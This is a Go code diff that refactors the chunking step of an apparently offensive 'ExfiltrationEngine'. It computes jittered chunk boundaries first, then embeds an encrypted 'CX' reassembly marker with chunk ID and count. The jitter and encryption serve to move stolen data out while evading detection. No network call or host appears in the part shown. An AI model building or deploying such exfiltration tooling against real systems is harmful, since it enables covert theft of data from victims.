@@ -160,30 +160,46 @@ func (e *ExfiltrationEngine) createChunks(job *types.ExfilJob) ([]*types.DataChu
 		baseSize = e.config.DefaultChunkSize
 	}
 
-	// Estimate total chunks (approximate; actual count varies due to jitter)
-	totalChunks := (len(data) + baseSize - 1) / baseSize
-	chunks := make([]*types.DataChunk, 0, totalChunks)
-
-	// Create chunks with ±25% size jitter per chunk
+	// First pass: chunk boundaries with ±25% size jitter per chunk.
+	// The real chunk count is only known once all boundaries are computed.
+	type span struct{ start, end int }
+	spans := make([]span, 0, (len(data)+baseSize-1)/baseSize)
 	for i := 0; i < len(data); {
 		lo := baseSize * 75 / 100
 		hi := baseSize * 125 / 100
 		if lo < 1 {
 			lo = 1
 		}
-		chunkSize := randInRange(lo, hi)
-		end := i + chunkSize
+		end := i + randInRange(lo, hi)
 		if end > len(data) {
 			end = len(data)
 		}
+		spans = append(spans, span{i, end})
+		i = end
+	}
 
-		chunkData := data[i:end]
+	totalChunks := len(spans)
+	if job.EncryptEnabled && totalChunks > 255 {
+		return nil, fmt.Errorf("too many chunks for CX marker protocol (%d > 255)", totalChunks)
+	}
 
-		// Apply encryption if enabled
+	chunks := make([]*types.DataChunk, 0, totalChunks)
+	for id, sp := range spans {
+		chunkData := data[sp.start:sp.end]
+
+		// Apply encryption if enabled. The encrypted payload embeds a 4-byte
+		// chunk marker "CX" + chunkID + totalChunks so the receiver can
+		// reassemble multi-chunk transfers into the original file.
 		if job.EncryptEnabled && e.cryptoEngine != nil {
-			encryptedData, err := e.cryptoEngine.Encrypt(chunkData)
+			payload := make([]byte, 4+len(chunkData))
+			payload[0] = 'C'
+			payload[1] = 'X'
+			payload[2] = byte(id)
+			payload[3] = byte(totalChunks)
+			copy(payload[4:], chunkData)
+			encryptedData, err := e.cryptoEngine.Encrypt(payload)
 			if err != nil {
-				return nil, fmt.Errorf("encryption failed for chunk %d: %w", len(chunks), err)
+				return nil, fmt.Errorf("encryption failed for chunk %d: %w", id, err)
 			}
 			chunkData = encryptedData
 		}
@@ -192,9 +208,9 @@ func (e *ExfiltrationEngine) createChunks(job *types.ExfilJob) ([]*types.DataChu
 		checksum := fmt.Sprintf("%x", sha256.Sum256(chunkData))
 
 		chunk := &types.DataChunk{
-			ID:          len(chunks),
+			ID:          id,
 			Data:        chunkData,
-			TotalChunks: totalChunks, // approximate; reassembly uses chunk ID ordering
+			TotalChunks: totalChunks,
 			Checksum:    checksum,
 			Status:      types.StatusPending,
 			Timestamp:   time.Now(),
@@ -202,12 +218,6 @@ func (e *ExfiltrationEngine) createChunks(job *types.ExfilJob) ([]*types.DataChu
 		}
 
 		chunks = append(chunks, chunk)
-		i = end
-	}
-
-	// Patch TotalChunks now that we know the real count
-	for _, ch := range chunks {
-		ch.TotalChunks = len(chunks)
 	}
 
 	return chunks, nil
